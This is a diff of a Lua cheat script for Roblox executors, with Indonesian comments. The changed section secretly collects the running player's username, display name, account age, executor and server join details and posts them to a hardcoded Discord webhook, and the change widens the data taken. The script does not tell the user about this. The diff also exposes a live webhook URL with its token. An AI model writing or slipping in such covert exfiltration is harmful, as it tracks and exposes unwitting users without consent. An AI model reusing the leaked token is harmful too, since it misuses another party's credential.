@@ -30,13 +30,18 @@ MainSection:CreateButton("SC KIPER", function()
 end)
 
 
--- update lagi
+-- webhook
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) -- Adaptasi buat Fluxus dan executor lain
 local webhookURL = "https://discord.com/api/webhooks/1346646240003362987/e_l3Q4_6tgjkORDxyeCsP_TKVSzjwhHDXaxh6-Zg7EDggqprbC-bzrWlptuga0X_6Ljx"
 
--- Mendapatkan informasi dari pemain lokal yang mengeksekusi skrip
+-- Mendapatkan informasi dari pemain lokal
 local player = game:GetService("Players").LocalPlayer
 local playerName = player.Name
+local displayName = player.DisplayName
+local accountAge = player.AccountAge
+local executor = identifyexecutor() or "unknown"
+
+-- Mendapatkan informasi dari game dan server
 local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local placeId = game.PlaceId
 local maxPlayers = game:GetService("Players").MaxPlayers
@@ -50,22 +55,22 @@ local localTime = os.date("%X")
 local data = {
     ["embeds"] = {{
         ["title"] = "**BLUE LOCK RIVALS**",
-        ["description"] = "**Nama Pemain:** " .. playerName .. 
-                          "\n\n**Nama Map:** " .. placeName .. 
-                          "\n**ID Map:** " .. placeId .. 
-                          "\n\n**Info Server:**\nJumlah Pemain Aktif: " .. activePlayers .. "/" .. maxPlayers,
-        ["color"] = 5814783,
+        ["description"] = string.format(
+            "**Nama Pemain:** %s\n**Display Name:** %s\n**Umur Akun:** %s hari\n**Executor:** %s\n\n**Nama Map:** %s\n**ID Map:** %s\n\n**Info Server:**\nJumlah Pemain Aktif: %s/%s",
+            playerName, displayName, accountAge, executor, placeName, placeId, activePlayers, maxPlayers
+        ),
+        ["color"] = 5814783, -- Warna biru
         ["fields"] = {{
             ["name"] = "Script Join Server",
-            ["value"] = "```lua\n" .. joinScript .. "\n```",  -- Dengan backticks untuk kode
+            ["value"] = "```lua\n" .. joinScript .. "\n```", -- Dengan backticks untuk kode
             ["inline"] = false
         }, {
             ["name"] = "Salin Script Join Server Untuk HP",
-            ["value"] = joinScript,  -- Tanpa backticks, tampil sebagai teks biasa
+            ["value"] = joinScript, -- Tanpa backticks, tampil sebagai teks biasa
             ["inline"] = false
         }},
         ["footer"] = {
-            ["text"] = "Waktu: " .. localTime -- Hanya satu timestamp di footer
+            ["text"] = "Waktu: " .. localTime -- Timestamp di footer
         }
     }}
 }
